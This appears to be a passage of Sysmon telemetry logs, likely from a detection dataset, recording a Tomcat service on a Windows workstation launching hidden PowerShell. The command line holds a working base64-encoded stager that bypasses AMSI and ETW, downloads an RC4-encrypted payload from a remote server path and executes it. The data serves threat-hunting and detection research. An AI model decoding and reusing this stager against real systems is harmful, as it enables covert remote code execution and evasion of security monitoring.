{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.42Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4160000Z\",\"EventType\":\"CreatePipe\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"PipeName\":\"\u003cAnonymous Pipe\u003e\"}","EventID":17,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.42Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4160000Z\",\"EventType\":\"ConnectPipe\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"PipeName\":\"\u003cAnonymous Pipe\u003e\"}","EventID":18,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.42Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4160000Z\",\"EventType\":\"CreatePipe\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"PipeName\":\"\u003cAnonymous Pipe\u003e\"}","EventID":17,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.42Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4160000Z\",\"EventType\":\"ConnectPipe\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"PipeName\":\"\u003cAnonymous Pipe\u003e\"}","EventID":18,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.437Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4200000Z\",\"ProcessGuid\":\"{f3329a35-1cb0-627e-f916-000000000600}\",\"ProcessId\":\"2084\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"FileVersion\":\"10.0.19041.546 (WinBuild.160101.0800)\",\"Description\":\"Windows PowerShell\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"PowerShell.EXE\",\"Hashes\":\"SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\",\"CommandLine\":\"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAHcAQQB1AEEARABVAEEATwBnAEEAMABBAEQAUQBBAE0AdwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBYAGYAUwBWAEIAOwBbAEkASwAzAGUALQBnAHQAagBUACMAXgB6AEwANABEAF8APABFAC8ALgB2AHIAbwA9AE8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGwAWAB4AGMAQgBkAD0AdgBxAHcAdQBpAG8AagBTAC8AUQBjAGUAaQBMAE4AZABIAFcAdABaAGcAeQBWACsARABwAFkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\",\"CurrentDirectory\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\\",\"LogonGuid\":\"{f3329a35-9472-627d-e503-000000000000}\",\"LogonId\":\"0x3e5\",\"TerminalSessionId\":\"0\",\"IntegrityLevel\":\"System\",\"ParentProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ParentProcessId\":\"3936\",\"ParentImage\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"ParentCommandLine\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe //RS//Tomcat9\",\"ParentUser\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":1,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.437Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4210000Z\",\"SourceProcessGUID\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"SourceProcessId\":\"3936\",\"SourceThreadId\":\"6296\",\"SourceImage\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"TargetProcessGUID\":\"{f3329a35-1cb0-627e-f916-000000000600}\",\"TargetProcessId\":\"2084\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"GrantedAccess\":\"0x1fffff\",\"CallTrace\":\"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9e664|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+8e73|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+71a6|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+1cbb4|C:\\\\Program Files\\\\Java\\\\jdk1.8.0_211\\\\jre\\\\bin\\\\java.dll+4d48|C:\\\\Program Files\\\\Java\\\\jdk1.8.0_211\\\\jre\\\\bin\\\\java.dll+4f0a|UNKNOWN(000000000173951B)\",\"SourceUser\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"TargetUser\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":10,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.437Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4210000Z\",\"SourceProcessGUID\":\"{f3329a35-9471-627d-0600-000000000600}\",\"SourceProcessId\":\"560\",\"SourceThreadId\":\"1632\",\"SourceImage\":\"C:\\\\Windows\\\\system32\\\\csrss.exe\",\"TargetProcessGUID\":\"{f3329a35-1cb0-627e-f916-000000000600}\",\"TargetProcessId\":\"2084\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"GrantedAccess\":\"0x1fffff\",\"CallTrace\":\"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9d234|C:\\\\Windows\\\\system32\\\\basesrv.DLL+326f|C:\\\\Windows\\\\SYSTEM32\\\\CSRSRV.dll+6490|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+5265f\",\"SourceUser\":\"NT AUTHORITY\\\\SYSTEM\",\"TargetUser\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":10,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.45Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4460000Z\",\"ProcessGuid\":\"{f3329a35-1cb0-627e-f916-000000000600}\",\"ProcessId\":\"2084\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"FileVersion\":\"10.0.19041.546 (WinBuild.160101.0800)\",\"Description\":\"Windows PowerShell\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"PowerShell.EXE\",\"Hashes\":\"SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.45Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4460000Z\",\"ProcessGuid\":\"{f3329a35-1cb0-627e-f916-000000000600}\",\"ProcessId\":\"2084\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\ntdll.dll\",\"FileVersion\":\"10.0.19041.1288 (WinBuild.160101.0800)\",\"Description\":\"NT Layer DLL\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"ntdll.dll\",\"Hashes\":\"SHA1=63E6167944DF951AD2D279D0B64E37BF2F604C07,MD5=47CCB0E28D73F695C5D5266FFBB300EC,SHA256=12D1BAC765448DB638ADC8327DE1101E5E2EB5829B8DA7EDD5B216A45C717EEC,IMPHASH=00000000000000000000000000000000\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.51Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.5060000Z\",\"ProcessGuid\":\"{f3329a35-1cb0-627e-f916-000000000600}\",\"ProcessId\":\"2084\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\kernel32.dll\",\"FileVersion\":\"10.0.19041.1348 (WinBuild.160101.0800)\",\"Description\":\"Windows NT BASE API Client DLL\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"kernel32\",\"Hashes\":\"SHA1=25DC8EBBAFBE5503DD1B863FADE063F93E350261,MD5=6CECC33A62E935F5E8665B9597479A36,SHA256=FFB8182763C23B8ABCEF35E85291422A1D6D165A0F4407BC68FFED0A58A2D03C,IMPHASH=D4DB3FB69E1EAF44E96269F1A467DCB9\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.513Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.5110000Z\",\"ProcessGuid\":\"{f3329a35-1cb0-627e-f916-000000000600}\",\"ProcessId\":\"2084\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\KernelBase.dll\",\"FileVersion\":\"10.0.19041.1387 (WinBuild.160101.0800)\",\"Description\":\"Windows NT BASE API Client DLL\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"Kernelbase.dll\",\"Hashes\":\"SHA1=D680D512026558300F86909C2DC9AD47400A7C5C,MD5=245DD16913DF918752FCEBFED9415F7A,SHA256=9401B4E07CEC3474EFD8429C0DF3E3DE1C7FFF7C3E914E135FCDCE0962654F94,IMPHASH=A28B494D0C0C82F1EEF0999B1549C6A6\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.517Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.5130000Z\",\"ProcessGuid\":\"{f3329a35-1cb0-627e-fa16-000000000600}\",\"ProcessId\":\"11780\",\"Image\":\"C:\\\\Windows\\\\System32\\\\conhost.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"FileVersion\":\"10.0.19041.1320 (WinBuild.160101.0800)\",\"Description\":\"Console Window Host\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"CONHOST.EXE\",\"Hashes\":\"SHA1=BA93B6F897778B91DB9D179E14C352AF82210061,MD5=D837FA4DEE7D84C19FF6F71FC48A6625,SHA256=22117361C2C34CB18BEEE2CA9770B3AA6C8D032A0941991454DD222BEC6D9295,IMPHASH=5E04B84014354D11014564789EE9BDA7\",\"CommandLine\":\"\\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1\",\"CurrentDirectory\":\"C:\\\\Windows\",\"LogonGuid\":\"{f3329a35-9472-627d-e503-000000000000}\",\"LogonId\":\"0x3e5\",\"TerminalSessionId\":\"0\",\"IntegrityLevel\":\"System\",\"ParentProcessGuid\":\"{f3329a35-1cb0-627e-f916-000000000600}\",\"ParentProcessId\":\"2084\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentCommandLine\":\"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAHcAQQB1AEEARABVAEEATwBnAEEAMABBAEQAUQBBAE0AdwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsA